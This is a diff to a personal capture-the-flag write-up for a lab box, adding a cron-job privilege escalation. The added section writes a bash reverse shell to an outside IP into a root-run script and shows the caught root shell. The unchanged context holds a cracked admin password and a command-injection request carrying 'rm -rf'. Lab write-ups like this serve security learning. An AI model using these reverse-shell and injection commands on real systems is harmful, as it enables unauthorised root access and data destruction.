@@ -19,6 +19,7 @@ tags:
   - Apache
   - IFS
   - htapasswd
+  - Cron
 references: "[[📚CTF Box Writeups]]"
 ---
 
@@ -270,6 +271,9 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 www-data@dmv:/var/www/html/admin$ cat .htpasswd
 cat .htpasswd
 itsmeadmin:$apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y/
+```
+- User flag - admin
+```
 www-data@dmv:/var/www/html/admin$ cat flag.txt
 cat flag.txt
 flag{0d8486a0c0c42503bb60ac77f4046ed7}
@@ -340,20 +344,50 @@ Stopped: Wed Oct 23 18:43:54 2024
 - The web admins credentials are `itsmeadmin:jessie`
 - Let's use that to log into the website admin portal
 - Looks like another BurpSuite situation. This page cleans downloads and sends an HTTP Get request `GET /admin/?c=rm%20-rf%20/var/www/html/tmp/downloads`
-- 
-
-
 
 
 ---
-# PrivEsc
+- Following walkthrough for the rest (timeline of taking exam requires me to go faster)
+---
+# Escalate
+- `ps aux`
+	- see `/usr/sbin/cron` running as root
+-  now use #pspy, can analyze processes running, in this case, `cron` 
+	- cd to `/var/www/html` and transfer `pspy64` to RHOST from LHOST
+	- `chmod +x pspy64`
+	- `./pspy64`
+		- shows commands relating to processes!
+		- Observe
+```
+2024/10/25 01:11:01 CMD: UID=0     PID=1412   | bash /var/www/html/tmp/clean.sh 
+2024/10/25 01:11:01 CMD: UID=0     PID=1411   | /bin/sh -c cd /var/www/html/tmp && bash /var/www/html/tmp/clean.sh 
+2024/10/25 01:11:01 CMD: UID=0     PID=1410   | /usr/sbin/CRON -f 
+```
+- `clean.sh` is a cron file overwrite
+- Get shell again.
+- cd `/var/www/html/tmp`, `chmod +rwx clean.sh`
+- echo reverse shell into `clean.sh`
+```
+echo 'bash -i >& /dev/tcp/10.2.1.119/4242 0>&1' > clean.sh
+```
+- start nc listener on port 4242, and wait...
+```
+┌──(root㉿kali)-[~/Transfer]
+└─# rlwrap nc -lnvp 4242
+listening on [any] 4242 ...
+connect to [10.2.1.119] from (UNKNOWN) [10.10.140.86] 58036
+bash: cannot set terminal process group (1472): Inappropriate ioctl for device
+bash: no job control in this shell
+root@dmv:/var/www/html/tmp# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+```
 
-- escalate to root
+- Since the cron job is run by root, we have a root shell!
 
-
-MAKE LINKS
-- PrivEsc_Linux
-- PrivEsc_Windows
-- HackTricks
-- GTFOBins
-- PayloadAllThings
+- Root flag
+```
+root@dmv:/var/www/html/tmp# cat /root/root.txt
+cat /root/root.txt
+flag{d9b368018e912b541a4eb68399c5e94a}
+```
